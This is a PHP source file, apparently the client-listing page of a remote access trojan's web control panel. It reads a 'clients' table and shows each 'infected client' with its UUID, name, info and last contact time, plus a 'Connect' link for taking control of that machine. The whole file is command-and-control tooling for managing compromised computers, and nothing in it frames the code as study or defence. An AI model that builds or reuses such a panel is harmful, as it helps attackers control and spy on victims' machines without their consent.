<!DOCTYPE html>
<?php
session_start();
if (!isset($_SESSION['Connected'])){
	echo '<script>window.location.href = "..?error=3";</script>';
	die();
}
if ($_SESSION['Connected'] != True) {
	echo '<script>window.location.href = "..?error=3";</script>';
	die();
}
?>
<html>
	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="stylesheet" href="../css/styles.css">
	</head>
	<body>
		<div id="mySidenav" class="sidenav">
			<a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
			<a href="..">Log In</a>
			<a href="">Clients</a>
			<!--<a href="">Services</a>-->
			<a href="../About.txt">About</a>
		</div>

		<div id="main">
			<div id='ActionBar'>
				<span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
			<div>
			<div id="main_inside">
				<h2>MySQL RAT Control Panel</h2>
				<p>Here You Can Remotely Control And Administrate Your Infected Clients, First You Need to login to your Account so you can access your Control Panel</p>
				<center>
					<table id="StyledTable" >
						<tr>
							<th>
								ID
							</th>
							<th>
								Connected
							</th>
							<th>
								UUID
							</th>
							<th>
								Name
							</th>
							<th>
								Info
							</th>
							<th>
								Last Contact
							</th>
							<th>
								Take Controll
							</th>
						</tr>
						<?php
							/*---------------- Connect to DB -----------------*/
							include('../Config.php');
							try
							{
								$bdd = new PDO('mysql:host='.$DB_Cfg_Host.';dbname='.$DB_Cfg_Name.';charset=utf8', $DB_Cfg_Username, $DB_Cfg_Password);
								array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION);
							}
							catch (Exception $e)
							{
								echo '<script>window.location.href = "..?error=2";</script>';
								die('Erreur : ' . $e->getMessage());
							}
							$reponse = $bdd->query('SELECT * FROM clients');

							while ($donnees = $reponse->fetch())
							{
								echo (
									"<tr>"
										."<td>".
											$donnees['ID']
										."</td>".
										"<td>".
											$donnees['Connected']
										."</td>".
										"<td>".
											$donnees['UUID']
										."</td>".
										"<td>".
											$donnees['Name']
										."</td>".
										"<td>".
											$donnees['Info']
										."</td>".
										"<td>".
											$donnees['Last Connection']
										."</td>".
										"<td>".
											'<a href="Service.php?ID='.$donnees['ID'].'" target="_BLANK">Connect</a>'
										."</td>".
									"</tr>"
									
								
								);
							}
							$reponse->closeCursor(); // Termine le traitement de la requête
						?>
					</table>
				</center>
			</div>
		</div>
		<script>
		function openNav() {
			document.getElementById("mySidenav").style.width = "250px";
			document.getElementById("main").style.marginLeft = "250px";
			document.getElementById("ActionBar").style.backgroundColor = "rgba(0,0,0,0.3)";
			document.body.style.backgroundColor = "rgba(0,0,0,0.1)";
		}
		function closeNav() {
			document.getElementById("mySidenav").style.width = "0";
			document.getElementById("main").style.marginLeft= "0";
			document.getElementById("ActionBar").style.backgroundColor = "#14171a";
			document.body.style.backgroundColor = "#979ba1";
		}
		</script>
	</body>
</html> 
